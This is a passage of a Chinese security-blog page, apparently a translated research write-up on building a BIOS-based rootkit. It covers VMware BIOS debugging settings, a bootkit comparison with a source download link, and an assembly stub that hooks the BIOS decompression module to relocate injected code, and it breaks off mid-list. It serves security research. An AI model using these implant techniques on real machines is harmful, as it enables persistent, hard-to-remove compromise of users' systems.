<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>基于BIOS的Rootkit | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; 基于BIOS的Rootkit评论Feed" href="http://www.mottoin.com/101307.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
        
</style>
<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Windows内核本地拒绝服务＃5(Windows 7-10)' href='http://www.mottoin.com/101306.html' />
<link rel='next' title='R2Games和Atlassian的HipChat被黑客入侵用户数据遭泄露' href='http://www.mottoin.com/101353.html' />
<link rel='shortlink' href='http://www.mottoin.com/?p=101307' />
<!--  WPCOM主题相关信息开始 -->
<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform">
<meta name="keywords" content="BIOS,rootkit">
<meta name="description" content="方法目前，创建BIOSrootkit的示例代码数量非常有限，唯一公开的代码与2009年3月的BIOSrootkit演示一起发布（据我所知）。我的第一个目标是重现CoreSecurity在2009年的研究结果，然后我的第二个任务是研究如何扩大他们的结果。我的最终目标是创建一些可以轻松部署的基于BIOS的rootkit。在2009年，已经进行了类似的安全领域的研究，这是基于引导扇区的rootkit。与">
<!--  WPCOM主题相关信息结束 -->
 
		<script type="text/javascript">

		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';

		</script>

	
		<style type="text/css">.request_name { display: none !important; }</style>

	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
    <style>
                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
        .list.tabs .tab.active a{border-bottom-color: #08c;}

        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
        .special-item-bottom a:hover:before{border-left-color: #07c;}
        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
        @media (max-width: 991px){
            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
            .navbar-collapse{background-color: #08c;}
            .dropdown-menu>li a{border-color: #07c;}
            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
        }
        .j-share{position: fixed!important;top: 50%!important;}
                .header .logo img{max-height: 32px;}
                @media (max-width: 767px){
            .header .logo img{max-height: 26px;}
        }
                        .btn-post{
    display: block;
    margin: 0 auto;
    padding: 15px 20px;
    font-size: 16px;
    text-align: center;
    color: #fff !important;
    line-height: 1;
    background: #1471CA;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
    border: 0;
    outline: 0;
}    </style>
    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-101307 single-format-standard">
<header class="header">
    <div class="container clearfix">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar icon-bar-1"></span>
                <span class="icon-bar icon-bar-2"></span>
                <span class="icon-bar icon-bar-3"></span>
            </button>
            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
        </div>
        <div class="collapse navbar-collapse">
            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
<li class="menu-item current-post-ancestor dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
	<li class="menu-item current-post-ancestor current-menu-parent current-post-parent"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
</ul></nav>            <div class="navbar-action pull-right">

                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
                    </form>

                    
                    <div id="j-user-wrap">
                        <a class="login" href="http://www.mottoin.com/login">登录</a>
                        <a class="login" href="http://www.mottoin.com/register">注册</a>
                    </div>
                    <a class="publish" href="http://www.mottoin.com/post">
                        投稿</a>
                                                </div>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</header>
<div id="wrap">    <div class="main container">
        <div class="content">
                            <article id="post-101307" class="post-101307 post type-post status-publish format-standard has-post-thumbnail hentry category-terminal tag-bios tag-rootkit">
                    <div class="entry">
                        <div class="entry-head">
                            <h1 class="entry-title">基于BIOS的Rootkit</h1>
                            <div class="entry-info">
                                                                <a class="nickname" href="http://www.mottoin.com/user/hypnos/">Jarry</a>
                                <span class="dot">•</span>
                                <span>2017年4月25日</span>
                                <span class="dot">•</span>
                                <a href="http://www.mottoin.com/category/article/terminal" rel="category tag">终端安全</a>                                                                    <span class="dot">•</span>
                                    <span>阅读 574</span>
                                                            </div>
                        </div>
                                                                        <div class="entry-content clearfix">
                            <h2 class="md-end-block md-heading md-focus"><span class="md-expand">方法</span></h2>
<p><span class="md-line md-end-block"><span class="">目前，创建BIOS rootkit的示例代码数量非常有限，唯一公开的代码与2009年3月的BIOS rootkit演示一起发布（据我所知）。我的第一个目标是重现Core Security在2009年的研究结果，然后我的第二个任务是研究如何扩大他们的结果。我的最终目标是创建一些可以轻松部署的基于BIOS的rootkit。</span></span></p>
<p><span class="md-line md-end-block"><span class="">在2009年，已经进行了类似的安全领域的研究，这是基于引导扇区的rootkit。与基于BIOS的rootkit不同，该领域的发展非常迅速，导致了许多不同的主引导记录（MBR）的rootkit正在开发和公布。这种类型的rootkit被称为“Bootkit”，这个比较类似于基于BIOS的rootkit，它旨在在加载操作系统之前加载自身。这种相似性导致许多bootkit开发人员指出应该可以直接从BIOS执行此类型的攻击，而不是从MBR加载。尽管有这样的想法，但还没有这样的代码公开的例子。</span></span></p>
<p><span class="md-line md-end-block"><span class="">完成这个项目的第一步是建立一个可以进行BIOS修改和调试的测试和开发环境。在他们关于持久性BIOS感染的论文中，Sacco和Ortega详细介绍了他们如何发现VMware包含一个BIOS ROM以及可用于从BIOS本身开始调试应用程序的GDB服务器。在VMware中取得成功之后，将已经完成了 VMware BIOS修改移植到其他类似的BIOS平台，我将在此写入的下半部分进行描述。</span></span></p>
<h2 class="md-end-block md-heading"><span class="">VMware BIOS配置</span></h2>
<p><span class="md-line md-end-block"><span class="">好的，现在有足够的背景资料去做这个了！</span></span></p>
<p><span class="md-line md-end-block"><span class="">所需的第一步是从VMware本身提取BIOS。在Windows中，可以使用任何资源提取器（Resource Hacker.）打开vmware-vmx.exe可执行文件。此应用程序中捆绑了许多不同的二进制资源，BIOS存储在资源ID 6006（至少在VMware 7中是这样的）。在其他版本中，这可能不同，但要查找的关键是资源文件大小为512kb。以下图像显示Resource Hacker中的内容：</span></span></p>
<p><img class="alignnone size-full wp-image-101327 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1-27.png" alt="1" width="1098" height="606" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1-27.png 1098w, http://www.mottoin.com/wp-content/uploads/2017/04/1-27-300x166.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1-27-768x424.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1-27-1024x565.png 1024w" sizes="(max-width: 1098px) 100vw, 1098px" /></p>
<p><span class="md-line md-end-block"><span class="">将此BIOS映像绑定到vmware-vmx.exe应用程序中，也可以单独使用它，而无需在每次更改后修改为vmware可执行文件。VMware允许在图像的VMX设置文件中指定多个“隐藏”选项。在某些时候，我打算在本网站的“工具”页面上记录一些文件，因为有些功能非常有用！对BIOS修改和调试有用比如：</span></span></p>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>bios440.filename = "BIOS.ROM"debugStub.listen.guest32 = "TRUE"debugStub.hideBreakpoint = "TRUE"monitor.debugOnStartGuest32 = "TRUE"</code></span></span></p>
<p><span class="md-line md-end-block"><span class="">第一个设置允许直接从文件而不是vmware-vmx应用程序加载BIOS rom。以下两行启用了内置的GDB服务器。每当image运行时，服务器将监听端口8832上的连接。最后一行指示VMware停止 guest image BIOS的第一行的代码执行。这是非常有用的，因为它允许在任何BIOS执行之前定义和断开内存。测试使用IDA Pro作为GDB客户端，并且在第一个BIOS指令中停止的VMware guest虚拟机示例可以在下面的屏幕截图中看到：</span></span></p>
<p><img class="alignnone size-full wp-image-101330 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/bios-2.png" alt="bios (2)" width="1068" height="851" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/bios-2.png 1068w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-2-300x239.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-2-768x612.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-2-1024x816.png 1024w" sizes="(max-width: 1068px) 100vw, 1068px" /></p>
<p><span class="md-line md-end-block"><span class="">最初使用此测试环境时，IDA与GDB服务器的连接存在重大问题。在与不同的GDB客户端进行了多次尝试和错误测试之后，发现是VMware的版本问题。版本6和6.5在IDA上看起来不是很好搞，所以VMware7被用于大多数测试。BIOS由16位代码组成，而不是IDA默认的32位代码，因此需要在IDA的调试选项中定义“手动内存区域”。这允许将内存地址定义为16位代码，以便它们正确反编译。</span></span></p>
<h2 class="md-end-block md-heading">重新创建过去的结果 &#8211; VMware BIOS修改</h2>
<p><span class="md-line md-end-block"><span class="">如前所述，Sacco&amp;Ortega已经对BIOS进行了两次修改，Wojtczuk&amp;Tereshkin也对BIOS进行了修改。在这三次演示中，只有Sacco&amp;Ortega演示包含其所描述技术的任何源代码或示例代码。由于这是唯一现有的示例，它被用作基于BIOS的rootkit项目的起点。</span></span></p>
<p><span class="md-line md-end-block"><span class="">Sacco&amp;Ortega的论文在描述其设置和测试技术方面相当全面。VMware安装程序如上所述完成，下一步是实现他们提供的BIOS修改代码。提供的代码需要将BIOS ROM提取到各个模块中。VMware附带的BIOS ROM是Phoenix BIOS。研究表明，使用这种类型的BIOS，一种称为“phxdeco”的开源工具和Phoenix Phoenix直接提供的名为“Phoenix BIOS Editor”的商业工具，有两个主要工具。Sacco&amp;Ortega的论文推荐使用Phoenix BIOS Editor应用程序，他们的代码就是用它。也有试用版可以从网上下载，页拥有该项目所需的所有功能。想找个下载链接，但没找到任何似乎甚至一半合法的试用版，但Google确实提供了各种链接。但我还是认为，找一些合法的试用版仍然很容易。安装工具后，下一步是构建自定义BIOS。</span></span></p>
<p><span class="md-line md-end-block"><span class="">我首先测试了在VMware对BIOS映像进行的小小修改，将更改了VMware徽标颜色并生效。接下来，我运行了由Sacco&amp;Ortega提供的Python编译脚本进行BIOS修改。除了Python BIOS程序集脚本中的一个print错误，一切都很好，一个新的BIOS被保存到磁盘。然而，将此BIOS加载到VMware并没有产生同样的成功，VMware会显示一条消息，指出虚拟机出现了错误的错误，并且正在被关闭。这个问题的调试是在IDA和GDB中完成的，但问题很难追溯（加上IDA有版本问题）。为了更快解决，我下了VMware的不同版本，为了测试环境将与Sacco&amp;Ortega的测试环境相匹配。经过一番搜索，他们使用的详细版本的VMware已找到并安装。不幸的是，仍然没有解决这个问题，VMware报告了同样的崩溃错误。虽然我已经看到BIOS修改工作作为演示文稿的一部分，现在很清楚，他们的示例代码需要额外的修改才能在任意测试系统上工作。</span></span></p>
<p><span class="md-line md-end-block"><span class="">通过调试Sacco&amp;Ortega的代码，学习了许多不同的东西，最终，问题被缩小到一个汇编程序指令，该指令正在执行远程调用绝对地址，该绝对地址不是正在使用的BIOS的正确地址。输入正确的地址后，BIOS代码成功执行，rootkit开始搜索硬盘驱动器进行修改。这段代码花了很长时间扫描硬盘（只有15gb），并且在系统启动之前多次运行。概念证明代码包括修补notepad.exe的功能，以便在启动时显示消息，或修改unix系统上的/etc/passwd文件，以便将root密码设置为固定值。</span></span></p>
<h2 class="md-end-block md-heading">Bootkit测试</h2>
<p><span class="md-line md-end-block">虽然项目时间比较久，但是还对各种bootkit代码的功能进行了测试，并重新创建了结果，以确定哪个最适合作为不仅仅是一个bootkit，而且还有一个基于BIOS的rootkit。检查了四个不同的启动程序，即Stoned，Whistler，Vbootkit和Vbootkit2 bootkits。Stoned和Whistler bootkits的设计功能比rootkit功能更像恶意软件，并没有一个简单的源代码结构。Vbootkit2启动工具有很大的不同，因为它不是被设计为恶意软件，并且（相对其他）有良好的源代码。该bootkit旨在从CD运行，但仅在Windows 7测试版中测试。当与Windows 7零售一起使用时，由于Windows使用不同的文件签名，所以bootkit根本没有加载。花一段时间用于确定新的文件签名，以便可以测试此bootkit，但仍然无法成功加载。为了允许测试Windows 7的beta版本。当Vbootkit2软件在Windows 7 beta系统上运行时，一切都按预期运行。Vbootkit2软件包括将进程升级到system（高于administrators）级别权限，捕获击键以及重置用户密码的功能。这些都是包含在rootkit中的有价值的项目，但是将该应用程序移植到Windows 7零售业仍然是很困难的工作。接下来检查Vbootkit软件; 它被设计为与Windows 2003，XP和2000一起使用。虽然它没有打包，以便可以从CD运行，但只需要稍微修改即可添加该功能。虽然这个软件只包括升级进程权限的能力，但这只是一个很有价值的功能。该bootkit软件被选择用于BIOS rootkit，这将在下一节中介绍。<span class=""><a spellcheck="false" href="http://www.nvlabs.in/">NVLabs</a></span>是bootkit本身的作者，因为是基于bootkit，所以它在很多方面代表了这个项目的主要功能，非常感谢他们将代码公开化！似乎他们的源代码在他们的网站上已经不再可用了，但是它仍然可以从<span class=""><a spellcheck="false" href="http://web.archive.org/web/20110728073636/http://www.nvlabs.in/uploads/projects/bootkit/bootkitprivilege.zip">Archive.org下载</a></span></span></p>
<h2 class="md-end-block md-heading"><span class="">BIOS代码注入</span></h2>
<p><span class="md-line md-end-block"><span class="">以前测试的Sacco&amp;Ortega的概念代码证明非常脆弱，其功能不是rootkit应该执行的操作类型。开发新的rootkit的第一步是开发一种强大的方法来使BIOS执行附加代码。</span></span></p>
<p><span class="md-line md-end-block"><span class="">Sacco&amp;Ortega修补了BIOS的解压缩模块，因为它已经被解压缩（因此它也可以解压所有其他内容），并且在BIOS被加载时被调用。这种推理比较合理，但是需要修改dll。在正常操作期间，BIOS会为存在的每个压缩BIOS模块调用一次解压缩模块。VMware BIOS包括22个压缩模块，因此要解压22次。该模块将覆盖我们的附加代码，因为它驻留在缓冲区空间中，因此有必要使我们的附加代码重新定位。</span></span></p>
<p><span class="md-line md-end-block"><span class="">我使用的过程包括以下步骤：</span></span></p>
<ul class="ul-list" data-mark="-">
<li class=""><span class="md-line md-end-block"><span class="">在解压缩模块的开头插入一个新的调用到我们的附加代码。</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">将我们所有的附加代码复制到新的内存部分。</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">更新解压缩模块调用以指向我们的代码所在的内存中的新位置。</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">返回到解压缩模块并继续执行。</span></span></li>
</ul>
<p><span class="md-line md-end-block">该过程允许将大量附加代码包括在BIOS ROM中，并且该代码在存储器中被移动到存储器之后从可靠的位置运行。上述四个步骤可以如下图所示：</span></p>
<p><img class="alignnone size-full wp-image-101331 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/bios-3.png" alt="bios (3)" width="960" height="540" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/bios-3.png 960w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-3-300x169.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-3-768x432.png 768w" sizes="(max-width: 960px) 100vw, 960px" /></p>
<p><span class="md-line md-end-block"><span class="">（mspaint真棒）</span></span></p>
<p><span class="md-line md-end-block"><span class="">在汇编器中实现这个问题可能有许多不同的方法，但目标是创建尽可能独立于系统的代码。为了实现这一点，所有绝对寻址都被删除，只有接近呼叫或跳转被使用。这个例外是对我们在可用内存中的位置引用，因为预计不管系统如何这是一个固定的位置。以下是用于处理代码重定位的汇编代码：</span></span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">start_mover:
; The following two push instructions will save the current state of the registers onto the
stack.
pusha
pushf

; Segment registers are cleared as we will be moving all code to segment 0
xor ax, ax              ; (This may or may not be obvious, but xor'ing the register sets it to 0).
xor di, di
xor si, si
push cs; Push the code segment into the data segment, so we can overwrite the calling address code
pop ds; (CS is moved to DS here)
mov es, ax              ; Destination segment (0x0000)
mov di, 0x8000              ; Destination offset, all code runs from 0x8000
mov cx, 0x4fff              ; The size of the code to copy, approximated as copying extra doesn't hurt anything

; The following call serves no program flow purposes, but will cause the calling address (ie, where this code
; is executing from) onto the stack. This allows the code to generically patch itself no matter where it might
; be in memory. If this technique was not used, knowledge of where in memory the decompression module would be
; loaded would be required in advance (so it could be hard coded), which is not a good solution as it differs for every system.
call b

b:
pop si                  ; This will pop our current address of the stack (basically like copying the EIP register)
add si, 0x30                ; How far ahead we need to copy our code
rep movsw               ; This will repeat calling the movsw command until cx is decremented to 0. When this command is 
                    ; finished, our code will be copied to 0x8000
mov ax, word [esp+0x12]         ; This will get the caller address to patch the original hook
sub ax, 3               ; Backtrack to the start of the calling address, not where it left off
mov byte [eax], 0x9a            ; The calling function needs to be changed to an Call Far instead of a Call Near
add ax, 1               ; Move ahead to set a new address to be called in future
mov word [eax], 0x8000          ; The new address for this code to be called at
mov word [eax+2], 0x0000        ; The new segment (0)

; The code has now been relocated and the calling function patched, so everything can be restored and we can return.
popf
popa

; The following instructions were overwritten with the patch to the DECOMPC0.ROM module, so we need to run them now before we return.
mov bx,es
mov fs,bx
mov ds,ax
ret                 ; Updated to a near return</pre>
<p><span class="md-line md-end-block"><span class="">一旦执行上述代码，它将复制自己到内存偏移0x8000，并修改最初调用它的指令，以便它现在将指向0x8000。为了初始测试这个代码，重新定位的代码只是一个例程，它会在屏幕上显示一个“W”（见下面的屏幕截图）。然而，最终目标是可以调用我们的rootkit代码，因此下一个修改是集成该代码。</span></span></p>
<p><img class="alignnone size-full wp-image-101332 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/bios-4.png" alt="bios (4)" width="228" height="355" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/bios-4.png 228w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-4-193x300.png 193w" sizes="(max-width: 228px) 100vw, 228px" /></p>
<p><span class="md-line md-end-block">如前面部分所述，“VBootkit”软件被确定为最适合可以从BIOS加载的rootkit功能类型。VBootkit软件最初创建，以便它可以从可引导CD运行。虽然这个起点与从BIOS运行相似，但是有一些关键的区别。这些差异主要是基于引导过程，如下所示：</span></p>
<p><img class="alignnone size-full wp-image-101333 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/bios-5.png" alt="bios (5)" width="241" height="361" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/bios-5.png 241w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-5-200x300.png 200w" sizes="(max-width: 241px) 100vw, 241px" /></p>
<p><span class="md-line md-end-block"><span class="">我们的基于BIOS的rootkit代码将在BIOS Entry和BIOS加载完成阶段之间的某处运行。bootkit会在最后一个阶段运行，从内存中的0x7C00开始。</span></span></p>
<p><span class="md-line md-end-block"><span class="">VBootkit软件被设计为将其加载到地址0x7C00中，此时它将重定位到地址0x9E000。然后它将挂起并中断0x13，然后将硬盘驱动器（MBR）的第一个扇区读入0x7C00，以便它可以执行，就好像bootkit从来没有出现。此过程需要修改，以便所有硬编码地址被替换（因为bootkit不再从0x7C00执行）。此外，不需要将MBR加载到内存中，因为BIOS将自行执行此操作。</span></span></p>
<p><span class="md-line md-end-block"><span class="">VBootkit软件hooks interrupt 0x13，也就是说，它取代了中断通常使用自己地址的地址，然后在进行其他处理后调用interrupt。原来，需要一个额外的修改，因为当我们的BIOS rootkit代码被称为interrupt 0x13仍然没有完全初始化。通过计数存储在多少次解压缩模块的运行中来克服这个问题。如果它已经运行了22次（22个模块），那么BIOS被完全初始化，我们可以安全地挂起 interrupt 0x13。</span></span></p>
<p><span class="md-line md-end-block"><span class="">Vbootkit软件遵循以下过程：</span></span></p>
<ul class="ul-list" data-mark="-">
<li class=""><span class="md-line md-end-block"><span class="">当第一次调用它将在内存中重定位到0x9E000（类似于之前完成的BIOS重定位）</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">接下来hook interrupt 0x13，这是硬盘访问中断</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">将检查所有硬盘活动以确定正在读取的数据</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">如果从硬盘读取Windows引导加载程序，引导加载程序在代码存储在内存中之前进行修改</span></span></li>
